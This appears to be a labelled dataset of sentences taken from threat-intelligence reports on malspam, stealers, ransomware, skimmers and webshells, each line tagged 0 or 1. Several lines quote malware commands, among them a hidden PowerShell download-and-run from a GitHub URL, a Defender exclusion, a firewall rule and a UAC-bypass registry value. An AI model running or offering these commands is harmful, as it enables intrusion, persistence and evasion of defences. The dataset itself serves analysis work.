0	Figure 1.COVID-19 themed malspam with link to the malicious document.
0	The technique is known as Remote Template Injection and is commonly used to evade static detection.
0	Figure 2.Code snippet of the settings.xml.rels with template referenced to an external target.
0	Figure 3.Microsoft Word document lure to enable macro.
0	Figure 4.VBA UserForm with embedded payloads.
0	Figure 5.Infection chain
0	HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run[%random%5] = %AppData%\Local\Microsoft\Windows\COM Surrogate\dllhost.exe
0	powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden $ProgressPreference = ',27h,'SilentlyContinue',27h,'; Invoke-WebRequest https://github.com/octopus734/BitcoinLight/releases/download/BitcoinLight/BitcoinLight.dat -OutFile "$env:appdata/Google` Chrome/chrome.exe"
0	"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" [%random%] = "%AppData%\Google Chrome\chrome.exe"
0	Files:COVID-19.docx
0	SHA1:94cd8f53b4022f9eeb41fb18ad6a62a746efebc7gentemplate.dotm
0	SHA1:2d05a7b796afd354f201c4778eed14334f08d25edllhost.exe
0	SHA1:9fb38b5ca038e5253832471474415c80ae39cce3
0	With this method, sent emails are likely to be opened and documents downloaded and executed by the recipients as they come from a trusted sender.
0	Figure 7.Sending the malicious document to the list of harvested contacts.
0	Summary
0	As we continue to deal with the threats of COVID-19-related malware with the resurgence of a new variant, threat actors are taking advantage of the health scares and uncertainties to deliver malware, harvest credentials, and ultimately, gain financially.
0	As usual, we advise all users to avoid clicking on URLs and attachments in unsolicited emails.
0	Executive summary
0	Crypto miners are determined in their objective of mining in other people's resources.
0	Proof of this is one of the latest samples identified with AT&T Alien Labs, with at least 100 different loaders and at least 4 different stages to ensure their miner and backdoor run smoothly in the infected systems.
0	Key takeaways:
0	Attackers have been sending malicious attachments, with a special emphasis on Mexican institutions and citizens.
0	Analysis
0	However, the legitimate files owned by Microsoft would have been signed with Microsoft certificate, which is not the case for these files - which have not been signed at all.
0	Pivoting by this indicator, returns over a hundred different samples that have been created and delivered during the last three months, most of them in the last weeks.
0	In addition to the product name CmRccService.exe, a similar decoy name was observed in this campaign RegistryManager.exe, which showed up in at least 6 different samples.
0	Figure 2.Persistence mechanism.
0	One of these domains is bekopgznpqe[.]is.
0	Initially created on February 22, 2022 with the name server 1984 Hosting Company, who offers domain names registration free of charge.
0	However, since this behavior indicator makes the domain look suspicious to security companies, the domain was moved to Cloudflare on April 21 (a different nameserver with a better reputation due to its popularity and absence of free offerings).
0	This technique has historically been used to improve the reputation of domains right before they are used during a campaign.
0	The executed command for these changes is 'C:\Windows\System32\cmd.exe' /C powershell New-NetFirewallRule -DisplayName 'RegistryManager' -Direction Inbound -Program 'C:\Windows\ImmersiveControlPanel\RegistryManager.exe' -Action Allow.
0	The command used for this purpose is powershell.exe $path = 'C:\Windows\Branding\oidz.exe' ; Add-MpPreference -ExclusionPath $path -Force.
0	The excluded folders and files include:C:\Users C:\Windows
0	Figure 3 recaps the execution flow until this point.
0	Figure 4.Oidz infinite loop.
0	Figure 5.C&C list.
0	Since it was first observed in April 2022, some of the executables have changed names or had some variations but have been excluded throughout the report to avoid confusion.
0	All the other files were preparing the environment for the miner, avoiding issues with execution, network communications or enabling modifications during the execution with the backdoor.
0	Search for your darkweb exposure
0	Home
0	About Us
0	Capabilities
0	Multiple Organisations compromised by Critical Authentication Bypass Vulnerability in Fortinet Products (CVE-2022-40684)
0	Threat Actors selling Fortinet access over the Darkweb
0	Multiple versions of Fortinet Products, including FortiOS, FortiProxy, and FortiSwitchManager, were affected by CVE-2022-40684.
0	November 24, 2022
0	October 10: Horizon3 Researchers tweeted about the vulnerability
0	One of the trends observed from the above timeline and past vulnerabilities is from the day when a vulnerability is disclosed in the public domain by official vendors and researchers.
0	A fictional timer starts among researchers, hackers, and people involved in patching the vulnerabilities.
0	A typical representation of the same can be observed in the figure below.
0	Distribution of initial access has played a vital role in some of the recent major ransomware attacks across the globe.
0	Conclusion
0	The authentication bypass vulnerability in Fortinet products allows an unauthenticated attacker to perform operations on the administrative interface.
0	Spyware targeting customers of Top Indian Banks
0	Menu
0	Threat Actors (TAs) use or create Malware to compromise or harm users through various malicious activities.
0	Spyware is one such example.
0	In this instance, we observed TAs utilizing spyware to steal sensitive data from infected devices  this data could include financial and personal information.
0	We have analyzed one of these samples.
0	Figure 7  App Permissions list
0	The below figure shows the launcher activity of the malware.
0	Figure 8  App Launcher Activity
0	Malware Behaviour
0	During our analysis, we observed that the application collects financial and personal information from the victim.
0	Code Evidence
0	14bf0cbee88507fb016d01e3ced053858410c389be022d2aa4d075287c781c4a
0	Tags
0	webshell
0	hiall.jsp
0	Author = "CISA Code & Media Analysis"
0	$s0 = { 72 65 71 75 65 73 74 }
0	No matches found.
0	ASCII text, with very long lines, with no line terminators
0	Screenshots
0	Figure 4 - This is what the resulting webpage looks like when the "cmd" parameter in the client request was "echo hello".
0	Recommendations
0	CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems.
0	Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.
0	Contact Information
0	1-888-282-0870
0	CISA Service Desk (UNCLASS)
0	You can help by answering a very short series of questions about this product at the following URL: https://us-cert.cisa.gov/forms/feedback/
0	Figure 4: Poor AV detection rate
0	Basically... skip the evasion component.
0	File TypeVisual Basic
0	Recorded Actions:+----------------------+-----------------------------------------------+-----------------------------------+| Action               | Parameters                                    | Description                       |+----------------------+-----------------------------------------------+-----------------------------------+
0	Menu
0	An AI Based Solution to Detecting the DoubleZero .NET Wiper
0	12,926
0	By Akshata Rao, Zong-Yu Wu and Wenjun Hu
0	November 18, 2022 at 6:00 PM
0	Category: Malware
0	Tags: .NET Framework, Cortex, Cortex XDR, DoubleZero wiper, Machine Learning, next-generation firewall, threat prevention, WildFire, wiper
0	This post is also available in:
0	We identify the challenges of detecting this threat through PE structural analysis and conclude by examining the cues picked up by the machine learning model to detect this sample.
0	The resources are contained within the .NET storage stream instead of the .rsrc section.
0	Figure 2.
0	.NET specific structures and the data they hold.
0	The metadata table contains defined tables for Module, MethodDef and Assembly among others.
0	These customized features improve the quality of our machine learning solutions.
0	This means that our models functionality has to be well understood by researchers, and that the predictions could be reverse engineered.
0	Because .NET files are so ubiquitous, they also have a highly imbalanced distribution of benign vs. malicious samples.
0	Consequently, the trained model has to ensure that we maintain extremely low false positive rates while retaining detection accuracy.
0	Figure 3.An overview of our detection workflow.
0	It contains only .text and .reloc sections, all of which are native to the PE file format and have fairly low entropy.
0	The following unmanaged APIs are used in the sample:
0	ntdll.ntopenfile
0	ntdll.rtlntstatustodoserror
0	In most of the use cases, there are equivalent managed functions in .NET runtime libraries to use.
0	Lsass is important to the Windows system, and any application that kills this process is most likely malicious.
0	The aforementioned file characteristics give us clues that the machine learning model uses to detect the sample.
0	2022 Palo Alto Networks, Inc. All rights reserved.
0	An example decompiled code snippet where the sample uses regular expressions to search the target files.
0	Affected Platforms: All OS
0	Impacted Parties: Online Shoppers
0	Impact: Loss of personally identifiable information and/or money
0	Severity Level: Low
0	However, for many, we are now also entering a season of hope.
0	The upcoming holiday season provides a heartful and joyful sensation that is a welcome relief from our other cares.
0	Figure 3.Fake Amazon survey site
0	The survey itself is trivialit asks for gender, age, shopping frequency on Amazon, and how the user rates Amazon service.
0	Once all questions are answered, the user will have three attempts to draw an iPhone from 12 gift boxes.
0	Fortunately, these outcomes are relatively benign.
0	For example, blackfriday[.]com is a legitimate Web site that users can use to view Black Friday ads from numerous popular shopping sites, such as Amazon, BestBuy, and Walmart.
0	Cyber Grinches actively try to take advantage of eager shoppers every year during the holiday season using new scams and techniques.
0	However, attackers still regularly find new victims using older and more familiar methods.
0	Below are some Dos and Donts to stay safe from e-commerce scams.
0	At Zscaler ThreatLabz, we have been closely monitoring web threats such as payment card skimming attacks against e-commerce stores.
0	Starting in July 2022, we have observed an increase in such activity targeted against Magento and Presta Shop e-commerce stores.
0	With Black Friday and the holiday season approaching, it is expected that there will be an increase in online shopping activity among users as they rush to take advantage of various discount offers.
0	These holiday shopping trends make skimming attacks even more lucrative for threat actors as they can increase their success rate of stealing payment card details of victims.
0	This string corresponds to the checkout page of the compromised e-commerce store and indicates that the user is ready to purchase the items added to the cart.
0	It then adds an event listener for this button which activates as soon as the user clicks it.
0	'number_key': cardNumber,
0	'exp_key': cartExp,
0	'cvc_key': cvv
0	The method used to collect the payment card information is customized according to the targeted e-commerce store.
0	Below are a few examples.
0	Stripe payment
0	Code searches for the following elementIDs in the web page to locate the card number, expiry date, and cvv code if Stripe payment processor is being used.
0	stripe-payments-card-numbers
0	stripe-payments-card-expirys
0	stripe-payments-card-cvcs
0	Figure 3 shows the data exfiltration function.
0	We do not have sufficient information at this point to do any attribution for this campaign.
0	Figure 4 shows the JavaScript skimming code for Magento e-commerce store.
0	The skimming code itself is straightforward.
0	Key functionalities
0	Figure 5 shows the corresponding elements on the checkout page.
0	Group 3
0	In July 2022, we observed a threat actor actively compromising Magento-based e-commerce stores and injecting script tags pointing to the skimmer code hosted on attacker-registered domains.
0	There is very limited information available about it in the public domain here.
0	Variant 1
0	URI path: "redirect-non-site.php?datasend="
0	Figure 7 shows the skimmer code.
0	We saw new activity from this threat actor in October 2022 when they started using an obfuscated version of the skimmer.
0	Group 4
0	In November 2022, we observed a threat actor injecting highly obfuscated variants of JavaScript skimmer in existing legitimate jQuery libraries on various Magento-based e-commerce stores.
0	We noticed 2 unique domains used for exfiltration of the payment card information.
0	Figure 8: Group 4 related skimmer domains undetected on VirusTotal
0	As is evident from the domain names, they impersonate as content delivery networks (CDNs) in order to blend in with legitimate traffic and this makes them even more difficult to detect at network layer.
0	modersecure[.]com
0	You have to login to access the Reading Center functionalities!
0	Username or Email Address
1	Furthermore the contents of the file and the network traffic reveal a connection to the cryptocurrency mining location "mine.c3pool.com:80"
1	Also present are user agent strings, from the network traffic, showing a connection attempt to a cryptocurrency mining location with a login ID and password.
1	CISA obtained four malicious files for analysis during an on-site incident response engagement at a Federal Civilian Executive Branch (FCEB) organization compromised by Iranian government sponsored advanced persistent threat (APT) actors.
1	The files include a kernel driver, two Windows executables, and a configuration file to control one of the executable's behavior on the network and infected host.
1	Attackers are taking advantage of these tools to make attribution difficult and reduce the cost for developing attack infrastructure.
1	This suggests the attackers intention to avoid detection by anti-virus software.The custom Quasar has a function to create error logs.
1	These infection chains leveraged phishing pages impersonating download pages of legitimate software, including cryptocurrency wallets or remote access tools, and the 911 method making use of YouTube videos and SEO-poised fake cracked software download websites.
1	Following is an overview of the Aurora stealer capabilities: data collection, exfiltration to its C2 server and load of the next-stage payload.
1	Aurora mainly uses the lxn/win library to interact with the Windows API, this library relies on Windows Management Instrumentation Command (WMIC).
1	To fingerprint the host, Aurora executes three commands on the infected host:
1	Like previously analysed stealers, Aurora also takes one screenshot of the infected host.
1	To collect information, Aurora targets multiple web browsers, as well as browser extensions including those managing cryptocurrency wallets and applications such as Telegram.
1	The malware uses the function walk of the built-in module path to loop over files and directories until it matches a filename or directory name of one of the targeted applications or extensions.
1	The malware communicates using TCP connection on ports 8081 and 9865  8081 being the most widespread open port.
1	The logic of Aurora in terms of network communication is straightforward, if a file name matches the stealer logic, the file is encoded in base64 and sent to the C2, following the message structure.
1	The analysed stealer always exfiltrated the screenshot first, and then the stolen files.
1	Aurora loader is straightforward, it downloads a remote payload using net_http_Get from the built-in library net/http, then the file is written on the disk in the temporary directory with a random name.
1	The stealer executes the next stage using the following PowerShell command:powershell.exe start-process C:\Users\Admin\AppData\Local\Temp\oH7P8GCPXQ.exe.
1	Aurora stealer is distributed using a phishing site impersonating Exodus Wallet (cryptocurrency wallet) hosted on hxxps://mividajugosa[.]com/.
1	Clicking on the Download button at the top right initiates the download of a ZIP ExodusWeb3.zip (SHA256: 2e9dbda19d9c75a82dabac8ffba5ea76689ada81639867c41c395a29aeaba788) that contains the executable ExodusWeb3.exe (SHA256: 9db1744112aea85c625cd046fc737bf28bef254bebfbf7123df6844f62167759) detected as Aurora stealer.
1	It communicates to its C2 server on 79.137.195[.]171:8081.
1	A YouTube video on a stolen account describing how to install a cracked software for free and providing a link;
1	From the link provided in the YouTube video, the victim can access a free software catalogue website.
1	The payload is hosted on a legitimate file sharing platform and embeds Aurora Stealer.
1	The user downloads it, decompresses the archive and executes the file setup.exe.4.
1	Before the actual ransomware execution can start, the ransomware must be delivered to the victims machine.
1	With the creativity and developed social skills of cybercrime syndicate members, there are different ways for the dropper to deliver its payload to the selected victims machine.
1	There can also be a chain execution of dropper modules (we observed the combination of QakBot and Cobalt Strike payloads) which finally leads to the ransomware execution.
1	The Black Basta dropper mimics the application for creating USB bootable drives hosted on this site:
1	The application is digitally signed with the same certificate (issued by Akeo Consulting) used for legitimate executables from the Rufus website:
1	If any of these techniques is successful in detecting a debugger and/or an emulation environment, the dropper stops its execution and quits without launching Black Basta.
1	The main point is to make a random number of calls to the kernel32.beep function.
1	The Black Basta payload is not simply unpacked and executed in memory; there is data located before the PE header of the ransomware to prevent automatic scanners from easily identifying the malicious payload.
1	As expected, the.imgscan command in WinDbg fails to reveal the Black Basta PE module in the droppers process memory.
1	The malware then sets the wallpaper and assigns a custom icon to the files with the .basta extension.
1	The ransomware also attempts to delete any shadow volume copies as shown in the image below：
1	The malware encrypts all the files found on the drives except for the ones that have the following strings in their paths:
1	This key is then passed to the RSA encryption with a hardcoded public key to retrieve 512 bytes of the encrypted ChaCha20 key.
1	To process a file, the usual kernel32 functions are used:
1	The ransomware tries to connect to AD with the help of LDAP API and iterates over the connected workstations using the filter string (samAccountType=805306369):
1	After the list of workstations is obtained, the ransomware tries to copy itself to the remote machines via the path \\c$\\Windows\mp.exe.
1	Then, with the help of the COM objects objectIWbemClassObject (CLSID: 4590F812-1D3A-11D0-891F-00AA004B2E24) and IWbemServices->Win32_Process, the executable copied in the previous stage is launched via the Create method.
1	This Ransomware strain uses a common ransom note which is downloaded from the remote server, and then appends content to the ransom note to make it specific to each of its victims.
1	This phishing website delivers ransomware disguised as a COVID tracking application, targeting Chilean users.
1	The ransomware calls the following functions for encrypting the files in the Victims machine.
1	Upon execution, the ransomware sleeps for five seconds using Thread.Sleep() method and executes GeneratePassword() function.
1	This function calls a method RNGCryptoServiceProvider() for generating a random string and then converts the random string into bytes using GetBytes() method.
1	This function further translates the bytes into Base64 encoded format and sends it to the C&C server.
1	Now the ransomware gets the volume of serial numbers of infected machines using a WMI query, as shown below.
1	The ransomware then pings google.com to check if victims system has an active internet connection and returns a Boolean value based on the response.
1	The ransomware identifies the victims IP using the API https[:]//api.ipify[.]org.
1	The data stored in this list is further sent to hxxp[:]//20[.]100.168[.]3[:]1974/handshake.php using a POST request, as shown below.
1	After sending the victims details to the C&C server, the ransomware checks if the UI directory exists in the C:\Users\Public\Windows\ folder.
1	If it exists, the ransomware deletes the existing directory in the Victims machine, creates a new directory with the same name, and sets the hidden and system attribute to the newly created directory.
1	The ransomware now downloads a .zip file containing the ransom note using a GET request from hxxp[:]//20.100.168[.]3[:]1974/alertmsg[.]zip and extracts it in the directory created in the above step.
1	It executes the DriveInfo.GetDrives() method to get the names of all logical drives in the machine and encrypts only files present in the USERPROFILE directory of C Drive.
1	The ransomware also targets all directories in other drives and encrypts files present in the directory.
1	The ransomware encrypts files having extensions such as .pptx, .docx, .doc, .xlsx, .txt, .pdf, .500, .jpeg, .jpg, .png.
1	The ransomware creates a string by concatenating the strings 2202sb+Volume Serial Number+ punished.
1	It converts the concatenated string into a BYTE array.
1	Finally, it calculates the MD5 hash of the array object.
1	The ransomware uses this MD5 hash as a final key and encrypts files using the AES-128 algorithm.
1	The ransomware also changes the extension of the encrypted files to .punisher and makes them unusable, as shown below.
1	These data points included PlugX installers signed by a potentially stolen digital certificate from a secure messaging client development studio Malware distribution via an employee monitoring system and a security package deployment service Unusual .NET code signed with the same potentially stolen certificate and calling back to the same domain as the PlugX C2
1	These PlugX payloads communicated with a C2 at apps.imangolm[.]com.
1	Not much later, this same security package deployment service was used to push GamePlayerFramework downloaders, with these downloaders communicating with the same C2, and signed with the same digital certificate.
1	The initial Tifa downloaders were already using Mango and Mongo function names just like artifacts found in Yuna downloaders, along with the aforementioned apps.imangolm[.]com C2 used by the PlugX implant.
1	Two of the Tifa.Downloader variants introduced a DownloaderVersion string, likely for the attackers to maintain backwards compatibility on the server side.
1	Once downloaded and persistence set up, multiple components load the framework.
1	After completing the startup process, the orchestrator starts sending heartbeat packets to the C2 server every 20 seconds.
1	Plugins can be configured to be downloaded from the C2 server when the framework starts up or is loaded at any other time using one of the commands above.
1	During its execution, a plugin may connect to the C2 server and receive commands from it.
1	Whenever a plugin is downloaded from the C2 server, it is loaded into the framework with the following procedure:The orchestrator selects a random port from 10000 to 20000 and launches a local TCP socket server on it.
1	The orchestrator creates a new svchost.exe process in suspended mode and injects the api-ms-win-core-sys-l1-0-5.dll library mentioned in the Loading the Framework section.
1	The Yuna.PuppetLoader.Downloader component downloads the plugin executable from the local TCP server and loads it using Load.
1	Connects to the C2 server via a TCP socket.
1	The address and port of the server is specified in the binary.
1	In the campaign shown above, victims are enticed to visit a malicious site claiming to provide live streaming of the FIFA World Cup 2022 opening ceremony.
1	The site then redirects to a fake streaming site hosted on Blogspot and users are prompted to create an account for free access to watch the live streaming event.
1	Case 3: SolarMarker malware activity SolarMarker is a well-known malware family with infostealer capabilities that use Search Engine Optimization (SEO) manipulation techniques to lure in victims and deliver the initial payload.
1	Most commonly, ThreatLabz researchers have observed these attackers hosting the malicious PDF files on compromised Wordpress sites with discoverable URLs and search engine results.
1	When the user clicks to download one of these fake PDFs they are automatically redirected to a hacker controlled site that delivers the malicious Microsoft's Windows Installer (MSI) service payload to perform the rest of the attack.
1	Notably, these attackers are also using SEO manipulation techniques to list the malicious PDF links in cracked FIFA games search engine results.
1	Parrot TDS is the fake update malware campaign, active since 2017, that works by injecting malicious JavaScript code into poorly secured content management systems CMS (i.e.Wordpress, Joomla), typically with weak admin passwords.
1	The infection chain starts with a web download from an attacker-controlled website.
1	The user is asked to download a ZIP file containing a JavaScript file that purports to be an important anti-virus or Windows 10 software update.
1	The .NET code decodes shellcode and injects it into another process.
1	The ransomware code runs from this process  first deleting shadow copy files and disabling Windows backup and recovery features, before encrypting the victims files (Figure 2).
1	Magniber requires administrator privileges to disable the victims ability to recover their data, so the malware uses a User Account Control (UAC) bypass to runs commands without alerting the user.
1	For the encryption task, the malware enumerates files and checks its file extension against a list.
1	Finally, the malware places a ransom note in each directory with an encrypted file and shows it to the victim by opening the note in a web browser.
1	Next, it decrypts an integer array and writes it into one of the MemoryStreams.
1	As mentioned in the overview, the campaigns start with a JavaScript file compressed in a ZIP archive.
1	Weve seen both JS and JSE files used.
1	JSE files are encoded JavaScript files.
1	After decoding the script, we see it instantiates several MemoryStream type ActiveXObjects.
1	Next, it decrypts an integer array and writes it into one of the MemoryStreams.
1	Once this is done, the MemoryStream is deserialized, giving us an executable .NET file.
1	When run, the code sets the memory protection of the array to PAGE_EXECUTE_READWRITE and decodes an array in a similar way to the encoded JavaScript in the previous phase.
1	The decoded array is shellcode which is run using the EnumUILanguages function, which takes a pointer to a callback function as its first argument.
1	The first shellcode stage decrypts a second stage, injects it into another process and finally runs it.
1	To make a syscall, an identifier is written to the EAX register and then the syscall function corresponding to that identifier is executed.
1	Magniber queries the operating system version and, for certain syscalls, runs through a switch-case statement before executing it.
1	This syscall is used to create a new thread, in this case in another process, where shellcode is injected.
1	This shellcode now runs in the context of another process, which is why the process chain is interrupted.
1	The first part deletes shadow copy files and disables backup and recovery features.
1	The second part recursively enumerates all the files on the filesystem and encrypts them based on their file extension.
1	Delete Shadow Copy Files and Disable Backup and Recovery
1	To delete the shadow copy files and disable Windows recovery features, Magniber requires administrator privileges, e.g.
1	However, even if the user is in the Administrators group, the malware must first bypass User Account Control, which allows a process to run with elevated privileges.
1	Magniber uses a UAC bypass that is triggered with the following steps:The malware creates the registry key HKCU\SOFTWARE\Classes\AppX04g0mbrz4mkc6e879rpf6qk6te730jfv\Shell\open\command.
1	The malware sets the key with the value wscript.exe /B / E:VBScript.Encode ../../Users/Public/hnzpfrdt.tex.
1	The malware writes an encoded VBScript into the Public directory containing commands that delete shadow copy files and disable backup and recovery features in Windows.
1	This process accesses the newly created registry key and runs the command stored in it, causing the VBScript to execute with elevated privileges and without user confirmation.
1	The VBScript deletes shadow copy files using Windows Management Instrumentation (WMI), deactivates the Windows recovery feature using the bcdedit command, then deletes the system backup using wbadmin.
1	After enumerating a file, the ransomware generates a pseudohash of the file extension.
1	The encrypted file is then renamed with another file extension that is unique to each Magniber sample.
1	Magnibers file extension hashes are best described as pseudohashes because no standard hash algorithm is used and the calculation causes hash collisions  meaning some files that arent in the attackers list of file extensions are also encrypted.
1	Finally, the ransomware tells the victim about what happened and how they can decrypt their data by dropping an HTML ransom note in every directory that contains an encrypted file.
1	To make sure the user sees the demand, Magniber also opens the note in a web browser.
1	Once launched, the malicious code collects data about the system on which it is launched.
1	And sends the details to a remote server.
1	Once launched, the malicious code collects data about the system on which it is launched.
1	The program uses trello.com to exchange data.
1	The exeGen script prevents the prospective threat actor from having to edit the source code themselves by allowing them to change the configuration via a handy GUI.
1	It makes it appear that the local infrastructure is attached to a sub-domain of ngrok.com and not the attackers actual location and IP address.
1	PyInstaller depositing files into the Windows Temp folder.
1	Once PyInstaller has deposited the necessary files and kicked off the Cryptonite process, it checks for an active Internet connection and shuts down if one is not detected.
1	Cryptonite will present a terminal showing an update's false download and installation.
1	It uses an implementation of Fernet (https://cryptography.io/en/latest/fernet/) to provide 128-bit AES against the whole of a targeted file.
1	Once all files have been encrypted, Cryptonite tries to identify where the victim is in the world from their IP address using ipinfo.io and attempts to phone home.
1	It connects to the aforementioned ngrok.io to pass the victims details back to the attacker.
1	Finally, a ransom window is created on the victims device that contains the attackers details, as shown in Figure 3.
1	The main dropper of the malware is a very small ELF file, where its total size is around only 370 bytes, while its actual code size is around 300 bytes.
1	The malware uses the Shikata Ga Nai polymorphic XOR additive feedback encoder, which is one of the most popular encoders used in Metasploit.
1	Using the encoder, the malware runs through several decode loops, where one loop decodes the next layer, until the final shellcode payload is decoded and executed.
1	After several decryption loops, the final payload shellcode will be decrypted and executed.
1	As the malware does not use any imports, it uses int 0x80 to execute the appropriate syscall.
1	As the main dropper code is very small, the malware will download and execute additional commands from its command and control by calling 102 syscall (sys_socketcall).
1	The received command will download additional files from the server that wont be stored in the hard drive, but rather will be executed from memory only.
1	In other malware versions, it will use the execve syscall to execute /bin/sh with command received from the C&C.
1	In addition the malware will use wget to download and execute the next stage dropper.
1	The malware decrypts a shell command that will be executed by calling syscall_execve with /bin/sh as a parameter with the decrypted shell.
1	To execute the next and last stage dropper, it will exploit two linux vulnerabilities to leverage privileges - CVE-2021-4034 and CVE-2021-3493 (figure 10 and 11).
1	The malware will leverage the exploit to download and execute the final stage with root privileges - persistence and cryptominer payload.
1	It will first check if the crontab command exists on the machine, and if not, the malware will install it and start the crontab service.
1	To make sure only one instance is running, it will use the flock command with a lock file /var/tmp/vm.lock.
1	Adding root crontab to execute the final payload.
1	It persists in the system by setting 4 crontabs, two for the current logged in user and the other two for the user root.
1	Adding root crontab to execute the final payload.
1	Check if crontab commands exist in the system, if not install it and start the crontab service.
1	Adds crontab for current user to execute cryptominer.
1	Adds root crontab to execute cryptominer.
1	Adds crontab for current user to download cryptominer and config from C&C.
1	Adds root crontab to download cryptominer and config from C&C.
1	The malware downloads and executes XMRig miner, a popular miner for the Monero cryptocurrency.
1	It will also set a crontab to download and execute the crypto miner and config from the C&C as mentioned in the persistence part above.
1	Shikitega uses cloud solutions to host some of its command and control servers (C&C) as shown by OTX in figure 14.
1	First, the email body has similar text, which as usual, directs the recipients attention to the attachment.
1	Second, the email contains only one attachment named request.doc, which is actually an ISO file.
1	In this campaign, the ISO attachment holds two files  a Microsoft Compiled HTML Help (CHM) file pss10r.chm and an executable app.exe.
1	Once the attacker tricks the recipient into extracting the contents of request.doc and then executes either one, the system can be compromised.
1	As shown in Figure 2, MailMarshal supports the unpacking of ISO and CHM files.
1	One of the objects unpacked from the CHM is the HTML file PSSXMicrosoftSupportServices_HP05221271.htm- the primary object that gets loaded once the CHM pss10r.chm is opened.
1	This HTML has a button object which automatically triggers the silent re-execution of the CHM pss10r.chm with mshta.
1	Looking at the CHM pss10r.chm statically, some HTML Application (HTA) code is noticeably lurking at the tail end.
1	The appended HTA has some JavaScript that silently runs app.exe, the second file inside the ISO attachment.
1	Note that for this loader to work, the executable must be extracted to the same directory as the CHM file.
1	Once executed, this malware will not proceed to its malicious routine if the computer and username of the system is JohnDoe and HAL9TH, respectively (artifacts from Windows Defender emulator), and if the following DLLs related to sandbox and AV and email scanners are loaded into the system.
1	The samples searched the following profiles and grab the C&C from the Bio section:
1	Then, it retrieves its configuration setting.
1	Vidar creates its own folder at C:\ProgramData.
1	The data it collected from the infected system are saved on C:\ProgramData\<random>\files.
1	Then, this is archived at C:\ProgramData\<random>\<machine GUID>.zip and sent to the C&C.
1	We observed in the code that in response, the C&C can send a download URL of an executable.
1	The vulnerability lies in the code used to handle IKEv1 (Internet Key Exchange) protocol, which is deprecated but compatible with legacy systems.
1	The POC exploits a memory corruption issue with the svchost of the vulnerable system.
1	Memory corruption occurs when Page Heap (a debugging plug-in) in the system is enabled for the Internet Key Exchange process.
1	Exchangeprotocol service crashes while attempting to read data beyond an allocated buffer.
1	If the client request body contains "c=", the script reads the contents of the body starting from the third character and executes it as a command in a separate process.
1	The output from that command is sent back to the client.
1	If the client request body does not contain "c=" and is not an empty string, the script will attempt to write a file on the victim web server.
1	The script decodes the base64 encoded data, and writes it to the location specified by the file directory and filename values obtained from the client request body.
1	If the file upload was successful, confirmation is sent back to the client.
1	This file is a JSP webshell.
1	It reads the value of the parameter named "raw" in the client request, which ends up being the shell command that gets run.
1	If the value of "raw" is not null and the OS is Windows, it starts a new process with the command "cmd /C {value of raw}".
1	If the value of "raw" is not null and the OS is Linux, it starts a new process with the command "/bin/bash -c {value of raw}".
1	Since the client sends in the value of "raw", it controls what gets run in the shell.
1	Lastly, the output of the command gets printed on the webpage for the client to see.
1	This file is a JSP webshell.When initially loaded, there will be a text box and a button named "Send".
1	The client can type anything in the text box.
1	Clicking the "Send" button will submit the form and send the request to the web server.
1	The string in the text box is sent over in the request parameter "cmd".
1	If the "cmd" parameter is not null when the web server receives the request, the script will detect the OS type.
1	If the OS is Windows, it starts a new process with the command "cmd /C {value of cmd}".
1	If the OS is Linux, it starts a new process with the command "{value of cmd}".
1	Since the client determines the value of "cmd", it controls what gets run in the shell.
1	Lastly, the command that ran and the output of that command gets printed on the webpage for the client to see.
1	Potential victims typically receive an email along with an attached document (aka malware lure) containing malicious logic that will trigger a multi-stage infection.
1	Today, they are typically loaded with a number of URLs for next-stage payloads, in the hopes that at least one of them is still available for retrieval at the time of infection.
1	The methods change, but currently it's common to use Emotet maldocs fetch a payload from some compromised WordPress site.
1	Once activated, the embedded VBA macro will connect the remote server at this address and downloads the second-stage payload:
1	This wiper is capable of typical, non-reversible and destructive actions that include the following:
1	Gaining the highest privilege in the host
1	Hunting down all available targeted files from every volume
1	Destroying targeted files or disk volumes within a short period of time
1	Microsoft Windows PE loader will already know how to load and execute the .NET sample once the framework is ready, since .NET assembly re-uses the PE file format.
1	During code generation, the source code for .NET compatible languages is compiled to platform-agnostic Common Intermediate Language (CIL) byte code.
1	A special .NET IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR can be found in the data directory for referencing the Cor20 header, as shown in Figure 1.
1	The Cor20 header (otherwise known as the CLR header) contains .NET specific information like versioning and resource information and the location of the Metadata header.
1	The resources, streams, type references, methods, CIL byte codes and usage of external assemblies are all in the metadata.
